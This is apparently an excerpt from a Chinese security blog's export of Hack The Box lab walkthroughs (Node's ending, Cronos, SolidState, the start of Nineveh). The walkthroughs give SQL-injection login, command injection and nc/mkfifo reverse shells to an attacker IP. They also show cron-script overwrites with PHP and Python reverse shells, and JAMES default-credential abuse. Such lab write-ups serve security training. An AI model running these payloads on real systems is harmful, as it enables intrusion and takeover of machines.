jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ QQQQQQQP&#39;.yQQQQQQQQQQQP&quot; &lt;wa,.!4WQQQQQQQWdWP??!&quot;??4WWQQQWQQc ?QWQQQQQ QQQQQP&#39;_a.&lt;aamQQQW!&lt;yF &quot;!` .. &quot;??$Qa &quot;WQQQWTVP&#39; &quot;??&#39; =QQmWWV?46/ ?QQQQQ QQQP&#39;sdyWQP?!`.-&quot;?46mQQQQQQT!mQQgaa. &lt;wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ QQ[ j@mQP&#39;adQQP4ga, -????&quot; &lt;jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?&quot;` -?QzQ7L ]QQQ QW jQkQ@ jWQQD&#39;-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc &quot;4QQQQa .QP4QQQQfWkl jQQQ QE ]QkQk $D?` waa &quot;?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`&quot;QQQD\\Qf(.QWQQ QQ,-Qm4Q/-QmQ6 &quot;WWQma/ &quot;??QQQQQQL 4W&quot;- -?$QQQQWP`s,awT$QQQ@ &quot;QW@?$:.yQQQQ QQm/-4wTQgQWQQ, ?4WWk 4waac -???$waQQQQQQQQF??&#39;&lt;mWWWWWQW?^ ` ]6QQ&#39; yQQQQQ QQQQw,-?QmWQQQQw a, ?QWWQQQw _. &quot;????9VWaamQWV???&quot; a j/ ]QQf jQQQQQQ QQQQQQw,&quot;4QQQQQQm,-$Qa ???4F jQQQQQwc &lt;aaas _aaaaa 4QW ]E )WQ`=QQQQQQQ QQQQQQWQ/ $QQQQQQQa ?H ]Wwa, ???9WWWh dQWWW,=QWWU? ?! )WQ ]QQQQQQQ QQQQQQQQQc-QWQQQQQW6, QWQWQQQk &lt;c jWQ ]QQQQQQQ QQQQQQQQQQ,&quot;$WQQWQQQQg,.&quot;?QQQQ&#39;.mQQQmaa,., . .; QWQ.]QQQQQQQ QQQQQQQQQWQa ?$WQQWQQQQQa,.&quot;?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ QQQQQQQQQQWWma &quot;9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ QQQQQQQQQQQQQQQws &quot;Tqau?9maZ?WQmaas,, --~-- --- . _ssawmQQQQQQk 3QQQQWQ QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}&lt;wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ QQQQQQQQQQQQQQQQQQQQQQWWQQga,-&quot;9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,. -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^&quot;!???????!^`_saQWWQQQQQQQ QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ 使用解压密码 magicword 进行查看后，得到了刚才我们发现了有趣的笑脸，查看代码后判断应该是关键字被列入黑名单了 /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt 我们使用通配符绕过黑名单 tom@node:/usr/local/bin$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt &lt;ac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWUoAy1l1eAsAAQQAAAAABAAAAACh3rCOvOQdB5V16DWzjmraL4LSDQyRE+gYobSHgwWoyN2auhvRchazKrlNmtBQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA 再去使用之前获得的解压密码 magicword 进行解压 ┌──(root㉿lucifiel)-[~/Desktop] └─# cat data UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWXLP2GJ1eAsAAQQAAAAABAAAAABxTsld158Zh1jLqaTlLhGh3omZpdVMsbbF4rimamhoJAz6zDqxvNxiE/AktcJQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA ┌──(root㉿lucifiel)-[~/Desktop] └─# base64 -d data &gt; data_encode ┌──(root㉿lucifiel)-[~/Desktop] └─# file data_encode data_encode: Zip archive data, at least v1.0 to extract, compression method=store ┌──(root㉿lucifiel)-[~/Desktop] └─# unzip data_encode Archive: data_encode [data_encode] root/root.txt password: extracting: root/root.txt ┌──(root㉿lucifiel)-[~/Desktop] └─# cat root/root.txt 1722e99ca5f353b362556a62bd5e6be0 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Cronos - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Cronos","date":"2022-07-14T11:38:36.000Z","updated":"2023-06-13T03:42:19.000Z","comments":true,"path":"2022/07/14/Hackthebox/Medium/Hackthebox-Cronos/","link":"","permalink":"http://www.lucifiel.com/2022/07/14/Hackthebox/Medium/Hackthebox-Cronos/","excerpt":"","text":"Hackthebox - Cronos靶场信息 靶场类型 信息收集Nmap┌──(root㉿lucifiel)-[~/Desktop] └─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.13 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 09:52 CST Warning: 10.10.10.13 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.13 Host is up (0.38s latency). Not shown: 65518 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA) | 256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA) |_ 256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519) 53/tcp open domain ISC BIND 9.10.3-P4 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.10.3-P4-Ubuntu 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.18 (Ubuntu) 11077/tcp filtered unknown 16431/tcp filtered unknown 23675/tcp filtered unknown 23791/tcp filtered unknown 24707/tcp filtered unknown 28968/tcp filtered unknown 30070/tcp filtered unknown 33874/tcp filtered unknown 36836/tcp filtered unknown 37062/tcp filtered unknown 41846/tcp filtered unknown 42917/tcp filtered unknown 45607/tcp filtered unknown 51186/tcp filtered unknown Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), Linux 3.12 (93%), Linux 3.13 (93%), Linux 3.8 - 3.11 (93%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 443/tcp) HOP RTT ADDRESS 1 368.17 ms 10.10.14.1 2 468.12 ms 10.10.10.13 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 87.93 seconds Http 默认的 apache 页面，fuzz 页面也没有可用的东西，可能在子域名 子域名加一个 host 解析 echo 10.10.10.13 cronos.htb &gt;&gt; /etc/hosts 然后跑一个子域名 ┌──(root㉿lucifiel)-[~/Desktop] └─# ffuf -u &#39;http://cronos.htb/&#39; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H &#39;Host:FUZZ.cronos.htb&#39; -fs 0,11439 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://cronos.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt :: Header : Host: FUZZ.cronos.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 0,11439 ________________________________________________ admin [Status: 200, Size: 1547, Words: 525, Lines: 57, Duration: 5550ms] www [Status: 200, Size: 2319, Words: 990, Lines: 86, Duration: 1331ms] fuzz 出有一个 admin，然后这边是加上 host 解析后，有了不同的变化 把解析出来的子域名给加个 hosts 解析 echo 10.10.10.13 admin.cronos.htb &gt;&gt; /etc/hosts 这边有一个登陆点，但是没有密码 漏洞利用 测试了一下存在 sql 注入，可直接使用万能密码进行登录 登入后有一个 traceroute 和 ping 功能，和 DVWA 相似啊，应该是可以拼接直接执行命令 去尝试一下是否可执行 确定可以执行命令 使用 nc 进行监听一个端口 nc -nvlp 4444 127.0.0.1|rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.4 4444 &gt;/tmp/f 使用如上语句来进行反弹 shel ┌──(root㉿lucifiel)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.4] from (UNKNOWN) [10.10.10.13] 57784 /bin/sh: 0: can&#39;t access tty; job control turned off $ whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) 成功获得一个 shel www-data@cronos:/home/noulis$ cat user.txt cat user.txt acd300bee378d6a90aece189fc7ce7f6 成功拿到 user 权限的 flag 文件 权限提升╔══════════╣ Cron jobs ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs /usr/bin/crontab incrontab Not Found -rw-r--r-- 1 root root 797 Apr 9 2017 /etc/crontab /etc/cron.d: total 24 drwxr-xr-x 2 root root 4096 May 10 14:51 . drwxr-xr-x 95 root root 4096 May 10 14:51 .. -rw-r--r-- 1 root root 102 Apr 6 2016 .placeholder -rw-r--r-- 1 root root 589 Jul 16 2014 mdadm -rw-r--r-- 1 root root 670 Mar 1 2016 php -rw-r--r-- 1 root root 191 Mar 22 2017 popularity-contest /etc/cron.daily: total 60 drwxr-xr-x 2 root root 4096 May 10 14:51 . drwxr-xr-x 95 root root 4096 May 10 14:51 .. -rw-r--r-- 1 root root 102 Apr 6 2016 .placeholder -rwxr-xr-x 1 root root 539 Apr 6 2016 apache2 -rwxr-xr-x 1 root root 376 Mar 31 2016 apport -rwxr-xr-x 1 root root 1474 Jan 17 2017 apt-compat -rwxr-xr-x 1 root root 355 May 22 2012 bsdmainutils -rwxr-xr-x 1 root root 1597 Nov 27 2015 dpkg -rwxr-xr-x 1 root root 372 May 6 2015 logrotate -rwxr-xr-x 1 root root 1293 Nov 6 2015 man-db -rwxr-xr-x 1 root root 539 Jul 16 2014 mdadm -rwxr-xr-x 1 root root 435 Nov 18 2014 mlocate -rwxr-xr-x 1 root root 249 Nov 13 2015 passwd -rwxr-xr-x 1 root root 3449 Feb 26 2016 popularity-contest -rwxr-xr-x 1 root root 214 May 24 2016 update-notifier-common /etc/cron.hourly: total 12 drwxr-xr-x 2 root root 4096 May 10 14:51 . drwxr-xr-x 95 root root 4096 May 10 14:51 .. -rw-r--r-- 1 root root 102 Apr 6 2016 .placeholder /etc/cron.monthly: total 12 drwxr-xr-x 2 root root 4096 May 10 14:51 . drwxr-xr-x 95 root root 4096 May 10 14:51 .. -rw-r--r-- 1 root root 102 Apr 6 2016 .placeholder /etc/cron.weekly: total 24 drwxr-xr-x 2 root root 4096 May 10 14:51 . drwxr-xr-x 95 root root 4096 May 10 14:51 .. -rw-r--r-- 1 root root 102 Apr 6 2016 .placeholder -rwxr-xr-x 1 root root 86 Apr 13 2016 fstrim -rwxr-xr-x 1 root root 771 Nov 6 2015 man-db -rwxr-xr-x 1 root root 211 May 24 2016 update-notifier-common SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin 17 * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly ) * * * * * root php /var/www/laravel/artisan schedule:run &gt;&gt; /dev/null 2&gt;&amp;1 这边看到一个有趣的程序运行在 root 上 /var/www/laravel/artisan www-data@cronos:/var/www/laravel$ ls -la /var/www/laravel/artisan ls -la /var/www/laravel/artisan -rwxr-xr-x 1 www-data www-data 1646 Apr 9 2017 /var/www/laravel/artisan 这边是可以看到，我们拥有写入权限，看看这是什么东西 www-data@cronos:/var/www/laravel$ cat artisan cat artisan #!/usr/bin/env php &lt;?php /* |-------------------------------------------------------------------------- | Register The Auto Loader |-------------------------------------------------------------------------- | | Composer provides a convenient, automatically generated class loader | for our application. We just need to utilize it! We&#39;ll require it | into the script here so that we do not have to worry about the | loading of any our classes &quot;manually&quot;. Feels great to relax. | */ require __DIR__.&#39;/bootstrap/autoload.php&#39;; $app = require_once __DIR__.&#39;/bootstrap/app.php&#39;; /* |-------------------------------------------------------------------------- | Run The Artisan Application |-------------------------------------------------------------------------- | | When we run the console application, the current CLI command will be | executed in this console and the response sent back to a terminal | or another output device for the developers. Here goes nothing! | */ $kernel = $app-&gt;make(Illuminate\\Contracts\\Console\\Kernel::class); $status = $kernel-&gt;handle( $input = new Symfony\\Component\\Console\\Input\\ArgvInput, new Symfony\\Component\\Console\\Output\\ConsoleOutput ); /* |-------------------------------------------------------------------------- | Shutdown The Application |-------------------------------------------------------------------------- | | Once Artisan has finished running. We will fire off the shutdown events | so that any final work may be done by the application before we shut | down the process. This is the last thing to happen to the request. | */ $kernel-&gt;terminate($input, $status); exit($status); 似乎是一个 php 的脚本，干啥的咱就别管他了，咱们可以写入一个用 php 反弹 shell 的语句进去，进行反弹 再开个 nc 进行一个其他端口的监听 nc -nvlp 5555 echo &#39;&lt;?php $sock=fsockopen(&quot;10.10.14.4&quot;,5555);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;); ?&gt;&#39; &gt; /var/www/laravel/artisan 然后执行后，等待一会儿就行了 ┌──(root㉿lucifiel)-[~/Desktop] └─# nc -nvlp 5555 listening on [any] 5555 ... connect to [10.10.14.4] from (UNKNOWN) [10.10.10.13] 53042 /bin/sh: 0: can&#39;t access tty; job control turned off # whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) 成功提权到 root 权限 # cat /root/root.txt 817402c7d13dc6ad8eff1f1af36d3382 成功获得 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"SolidState - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-SolidState","date":"2022-07-11T11:38:36.000Z","updated":"2023-06-13T03:52:35.000Z","comments":true,"path":"2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/","link":"","permalink":"http://www.lucifiel.com/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/","excerpt":"","text":"Hackthebox - SolidState靶场信息 靶场类型 信息收集Nmap┌──(root㉿lucifiel)-[~/Desktop] └─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.51 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 09:27 CST Nmap scan report for 10.10.10.51 Host is up (0.38s latency). Not shown: 65529 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0) | ssh-hostkey: | 2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA) | 256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA) |_ 256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519) 25/tcp open smtp JAMES smtpd 2.3.2 |_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.19 [10.10.14.19]), PIPELINING, ENHANCEDSTATUSCODES 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-title: Home - Solid State Security |_http-server-header: Apache/2.4.25 (Debian) 110/tcp open pop3 JAMES pop3d 2.3.2 |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_ssl-cert: ERROR: Script execution failed (use -d to debug) 119/tcp open nntp? |_sslv2: ERROR: Script execution failed (use -d to debug) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) 4555/tcp open rsip? | fingerprint-strings: | GenericLines: | JAMES Remote Administration Tool 2.3.2 | Please enter your login and password | Login id: | Password: | Login failed for |_ Login id: 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port4555-TCP:V=7.92%I=7%D=7/11%Time=62CB7C97%P=aarch64-unknown-linux-gn SF:u%r(GenericLines,7C,&quot;JAMES\\x20Remote\\x20Administration\\x20Tool\\x202\\.3\\ SF:.2\\nPlease\\x20enter\\x20your\\x20login\\x20and\\x20password\\nLogin\\x20id:\\n SF:Password:\\nLogin\\x20failed\\x20for\\x20\\nLogin\\x20id:\\n&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=7/11%OT=22%CT=1%CU=39286%PV=Y%DS=2%DC=T%G=Y%TM=62CB7DA OS:6%P=aarch64-unknown-linux-gnu)SEQ(SP=104%GCD=3%ISR=10F%TI=Z%CI=I%TS=8)SE OS:Q(SP=104%GCD=1%ISR=10F%TI=Z%CI=I%II=I%TS=8)SEQ(SP=104%GCD=1%ISR=10F%TI=Z OS:%II=I%TS=8)OPS(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11 OS:NW7%O5=M539ST11NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=71 OS:20%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=4 OS:0%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O OS:=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40 OS:%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q OS:=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y OS:%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1720/tcp) HOP RTT ADDRESS 1 461.02 ms 10.10.14.1 2 434.42 ms 10.10.10.51 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 304.88 seconds Http 这边我 fuzz 和寻找了一下，都没看到什么东西，咱们换个思路 4555 端口这边有一个 4555 端口，这种异常端口一看就不对劲。JAMES Remote Administration Tool 2.3.2，这边扫描端口的时候有提示版本信息，去搜索一下 漏洞利用得知了这是一个 pop3 协议的邮件服务器，默认账号密码都是 root，去使用 telnet 登陆一下 ┌──(root㉿lucifiel)-[~/Desktop] └─# telnet 10.10.10.51 4555 Trying 10.10.10.51... Connected to 10.10.10.51. Escape character is &#39;^]&#39;. JAMES Remote Administration Tool 2.3.2 Please enter your login and password Login id: root Password: root Welcome root. HELP for a list of commands help Currently implemented commands: help display this help listusers display existing accounts countusers display the number of existing accounts adduser [username] [password] add a new user verify [username] verify if specified user exist deluser [username] delete existing user setpassword [username] [password] sets a user&#39;s password setalias [user] [alias] locally forwards all email for &#39;user&#39; to &#39;alias&#39; showalias [username] shows a user&#39;s current email alias unsetalias [user] unsets an alias for &#39;user&#39; setforwarding [username] [emailaddress] forwards a user&#39;s email to another email address showforwarding [username] shows a user&#39;s current email forwarding unsetforwarding [username] removes a forward user [repositoryname] change to another user repository shutdown kills the current JVM (convenient when James is run as a daemon) quit close connection 登陆成功，命令中有列账号的功能和重置密码的功能，去看一下 Unknown command listusers Existing accounts 5 user: james user: thomas user: john user: mindy user: mailadmin setpassword mindy admin Password for mindy reset 将帐户 mindy 的密码给重置了，然后去 110 端口登陆一下 ┌──(root㉿lucifiel)-[~/Desktop] └─# telnet 10.10.10.51 110 Trying 10.10.10.51... Connected to 10.10.10.51. Escape character is &#39;^]&#39;. +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready user mindy +OK pass admin +OK Welcome mindy list +OK 2 1945 1 1109 2 836 . retr 2 +OK Message follows Return-Path: &lt;mailadmin@localhost&gt; Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt; MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581 for &lt;mindy@localhost&gt;; Tue, 22 Aug 2017 13:17:28 -0400 (EDT) Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT) From: mailadmin@localhost Subject: Your Access Dear Mindy, Here are your ssh credentials to access the system. Remember to reset your password after your first login. Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. username: mindy pass: P@55W0rd1!2@ Respectfully, James . Connection closed by foreign host. 得到了一个账号密码 username = mindy password = P@55W0rd1!2@ ┌──(root㉿lucifiel)-[~/Desktop] └─# ssh mindy@10.10.10.51 The authenticity of host &#39;10.10.10.51 (10.10.10.51)&#39; can&#39;t be established. ED25519 key fingerprint is SHA256:rC5LxqIPhybBFae7BXE/MWyG4ylXjaZJn6z2/1+GmJg. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.10.51&#39; (ED25519) to the list of known hosts. mindy@10.10.10.51&#39;s password: Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142 mindy@solidstate:~$ whoami&amp;&amp;id -rbash: whoami: command not found 进去了，但没完全进去 mindy@solidstate:~$ cat user.txt 80d14d9b351c71c448bd5500e43c222e 得到了 user 权限的 flag 文件 权限提升rbash 逃逸mindy@solidstate:~$ cd -rbash: cd: restricted 根据情况看，这是一台受限的 rbash，去想办法逃逸一下 https://xz.aliyun.com/t/7642 找到了一篇文章 使用了其中一个指定 bash 的方法成功逃逸 ssh mindy@10.10.10.51 -t &quot;bash --noprofile&quot; 成功逃逸 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami&amp;&amp;id mindy uid=1001(mindy) gid=1001(mindy) groups=1001(mindy) Root查看一下当前运行的进程 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ps aux|grep james root 556 0.0 0.0 2332 616 ? Ss Jul10 0:00 /bin/sh /opt/james-2.3.2/bin/run.sh root 575 0.1 3.7 854972 77232 ? Sl Jul10 0:19 /usr/lib/jvm/java-8-openjdk-i386//bin/java -Djava.ext.dirs=/opt/james-2.3.2/lib:/opt/james-2.3.2/tools/lib -Djava.security.manager -Djava.security.policy=jar:file:/opt/james-2.3.2/bin/phoenix-loader.jar!/META-INF/java.policy -Dnetworkaddress.cache.ttl=300 -Dphoenix.home=/opt/james-2.3.2 -Djava.io.tmpdir=/opt/james-2.3.2/temp -jar /opt/james-2.3.2/bin/phoenix-loader.jar mindy 23970 0.0 0.0 4736 800 pts/0 S+ 02:15 0:00 grep james 可以看到，有一个 sh 一直运行着的 run.sh 文件去查看下是啥东西 ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat /opt/james-2.3.2/bin/run.sh #! /bin/sh # # ----------------------------------------------------------------------------- # Phoenix start script. # # OS specific support. $var _must_ be set to either true or false. cygwin=false case &quot;`uname`&quot; in CYGWIN*) cygwin=true;; esac # resolve links - $0 may be a softlink THIS_PROG=&quot;$0&quot; while [ -h &quot;$THIS_PROG&quot; ]; do ls=`ls -ld &quot;$THIS_PROG&quot;` link=`expr &quot;$ls&quot; : &#39;.*-&gt; \\(.*\\)$&#39;` if expr &quot;$link&quot; : &#39;.*/.*&#39; &gt; /dev/null; then THIS_PROG=&quot;$link&quot; else THIS_PROG=`dirname &quot;$THIS_PROG&quot;`/&quot;$link&quot; fi done # Get standard environment variables PRGDIR=`dirname &quot;$THIS_PROG&quot;` PHOENIX_HOME=`cd &quot;$PRGDIR/..&quot; ; pwd` unset THIS_PROG # For Cygwin, ensure paths are in UNIX format before anything is touched if $cygwin; then [ -n &quot;$PHOENIX_HOME&quot; ] &amp;&amp; PHOENIX_HOME=`cygpath --unix &quot;$PHOENIX_HOME&quot;` fi $PHOENIX_HOME/bin/phoenix.sh run $* 没看到啥有用的东西 但是可以确定的是肯定和 opt 目录下的东西有关，咱们去看看 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -la total 16 drwxr-xr-x 3 root root 4096 Aug 22 2017 . drwxr-xr-x 22 root root 4096 May 27 11:05 .. drwxr-xr-x 11 root root 4096 Apr 26 2021 james-2.3.2 -rwxrwxrwx 1 root root 105 Aug 22 2017 tmp.py 这边有点异常，在 &#x2F;opt 目录下发现一个 tmp.py 的文件，权限是 777 的 ${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py #!/usr/bin/env python import os import sys try: os.system(&#39;rm -r /tmp/* &#39;) except: sys.exit() 这边看着像是个实时运行的脚本，尝试写入反弹 shell 的东西 echo &quot;import os;os.system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.19 4444 &gt;/tmp/f&#39;)&quot; &gt; /opt/tmp.py 然后使用 nc 监听一个端口 ┌──(root㉿lucifiel)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.19] from (UNKNOWN) [10.10.10.51] 37764 /bin/sh: 0: can&#39;t access tty; job control turned off # whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) 成功拿到 root 权限 # cat /root/root.txt 096c5f57afdfe824d5827ea17af7756c 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Nineveh - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Nineveh","date":"2022-07-08T11:38:36.000Z","updated":"2023-06-13T03:47:39.000Z","comments":true,"path":"2022/07/08/Hackthebox/Medium/Hackthebox-Nineveh/","link":"","permalink":"http://www.lucifiel.com/2022/07/08/Hackthebox/Medium/Hackthebox-Nineveh/","excerpt":"","text":"Hackthebox - Nineveh靶场信息 靶场类型 信息收集Nmap┌──(root㉿lucifiel)-[~/Desktop] └─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.43 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-05 09:06 CST Nmap 